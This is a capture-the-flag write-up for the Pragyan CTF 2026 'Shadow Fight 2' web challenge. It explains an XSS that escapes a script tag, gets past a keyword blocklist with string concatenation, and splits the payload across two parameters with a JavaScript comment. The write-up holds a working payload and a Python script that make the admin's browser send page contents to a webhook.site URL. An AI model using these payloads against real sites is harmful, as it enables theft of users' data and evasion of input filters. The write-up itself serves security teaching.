# Shadow Fight 2

**CTF/platform:** Pragyan CTF 2026

**Category:** Web / XSS

**Difficulty:** Medium-Hard

**Description:** "Do you know more XSS?"

**Remote:** `https://shadow-fight-2.ctf.prgy.in`

**Flag:** `p_ctf{admz_nekki_kekw_c6e194c17f2405c5}`

---

## Reconnaissance

The application is identical to Shadow Fight 1: a **Profile Card Generator** with `name` and `avatar` parameters, closed Shadow DOM with the flag, and a "Submit for Review" button that sends to the admin bot.

### Differences from SF1

1. **Server-side validation**: The server now applies the SAME blocklist as the client-side (`fetch`, `document`, `window`, `location`, `from`, `char`, `code`, `%`, etc.)
2. **50 character limit** on the `name` parameter (server-side enforced)
3. **Server-side avatar validation**: Requires `https://`, whitelisted domain, and passes `isSafe()`
4. New words in the blocklist: `code`, `%`

### What remains the same

- The server does NOT escape `<` or `>` in HTML output
- No Content-Security-Policy (CSP)
- `x-xss-protection: 0`
- The `</script>` technique to break the tag still works

---

## Problem Analysis

In SF1, the complete payload went in the `name` parameter:
```
</script><script>fetch('/').then(r=>r.text()).then(t=>{...})</script>
```

In SF2 this fails for three reasons:
1. `fetch` is server-side blocked
2. `document` is server-side blocked
3. The payload exceeds 50 characters

### Blocklist bypass: String concatenation

For blocked words, we can use string concatenation:
- `this['fe'+'tch']` instead of `fetch` (the server searches for substrings, `fe'+'tch` doesn't contain `fetch`)

### 50 char limit bypass: Split-Comment technique

The name has 50 chars max, but the avatar can be long (500+ chars tested). The idea is to **split the payload between both parameters** using a JavaScript multiline comment.

---

## Vulnerability: Split-Comment XSS

### How it works

The server injects both parameters into JavaScript without escaping:
```javascript
const name = "NAME_VALUE";
const avatar = "AVATAR_VALUE";
```

**Step 1:** In `name`, we inject `</script><script>/*` (19 chars):
```javascript
const name = "</script><script>/*";
const avatar = "AVATAR_VALUE";
```

The browser interprets:
1. First `<script>`: `const name = "` → JS error, ignored
2. `</script>` closes the script
3. New `<script>` with content starting with `/*`

**Step 2:** The `/*` opens a multiline comment that "swallows" everything until we find `*/`:
```javascript
/*";
    const avatar = "https://picsum.photos/*/PAYLOAD//";
```

- `/*` opens the comment
- `";\n    const avatar = "https://picsum.photos/` is commented
- `*/` closes the comment (comes from the avatar path)
- `PAYLOAD` executes as free JavaScript
- `//` comments the rest of the line (`";`)

**Step 3:** The payload uses `this['fe'+'tch']` to avoid the blocklist.

---

## Exploitation

### Payload

**Name** (19 chars):
```
</script><script>/*
```

**Avatar** (190 chars):
```
https://picsum.photos/*/this['fe'+'tch']('/').then(r=>r.text()).then(t=>{new Image().src='https://webhook.site/UUID?f='+(t.match(/p_ctf[^<]+/)||['no'])[0]})//
```

### Exploitation script

```python
#!/usr/bin/env python3
import requests
requests.packages.urllib3.disable_warnings()

BASE = "https://shadow-fight-2.ctf.prgy.in"
WEBHOOK = "https://webhook.site/YOUR-UUID"

name = "</script><script>/*"

payload = (
    "this['fe'+'tch']('/').then(r=>r.text()).then(t=>{"
    "new Image().src='" + WEBHOOK + "?f='"
    "+(t.match(/p_ctf[^<]+/)||['no'])[0]})"
)
avatar = "https://picsum.photos/*/" + payload + "//"

r = requests.post(f"{BASE}/review",
                  params={"name": name, "avatar": avatar},
                  verify=False, timeout=10)
print(f"Response: {r.text}")
```

### Result in webhook

```
GET /?f=p_ctf{admz_nekki_kekw_c6e194c17f2405c5}
```

---

## Generated HTML (browser view)

```html
<!-- Script 1: broken, ignored -->
<script>
    const name = "
</script>

<!-- Script 2: our XSS -->
<script>
/*";
    const avatar = "https://picsum.photos/*/this['fe'+'tch']('/').then(r=>r.text()).then(t=>{new Image().src='https://webhook.site/UUID?f='+(t.match(/p_ctf[^<]+/)||['no'])[0]})//";
    const nameIsValid = name && validateName(name);
    ...
</script>
```

Script 2 breakdown:
```
/*  ... multiline comment ...  */     ← everything between /* and */ ignored
this['fe'+'tch']('/')...                   ← executable JavaScript
//";                                       ← line comment
const nameIsValid = ...                    ← executes normally (but name="" → false)
```

---

## Flag

```
p_ctf{admz_nekki_kekw_c6e194c17f2405c5}
```

`admz_nekki_kekw` → reference to the Shadow Fight game (Nekki is the developer of the Shadow Fight game).

---

## Key Techniques

1. **Split-Comment XSS**: Divide the payload between two injection points using `/* ... */`
2. **String Concatenation Bypass**: `this['fe'+'tch']` avoids substring filters
3. **Script Tag Escape**: `</script>` remains the base of the attack
4. **Exfiltration via fetch + regex**: Get the HTML source and extract the flag with regex

## Lessons

1. **Server-side validation is not enough if output HTML is not escaped**. The filter blocked keywords but not the HTML metacharacters `<` and `>`.
2. **Multiple injection points = payload splitting**. If one parameter has a length limit, you can use another parameter as continuation.
3. **JavaScript multiline comments (`/* */`) are powerful tools** to "jump" code between two injection points.
4. **Substring filters are bypassable** with concatenation: `'fe'+'tch'` doesn't contain `fetch`.
5. **Without CSP, any filter bypass is game over**.

---

## PoC

### Exploit Execution

<img src="pragshadow2.png" alt="Exploit execution" width="800">

*Screenshot showing successful execution of the advanced XSS exploit with split-comment technique and flag capture for Shadow Fight 2.*
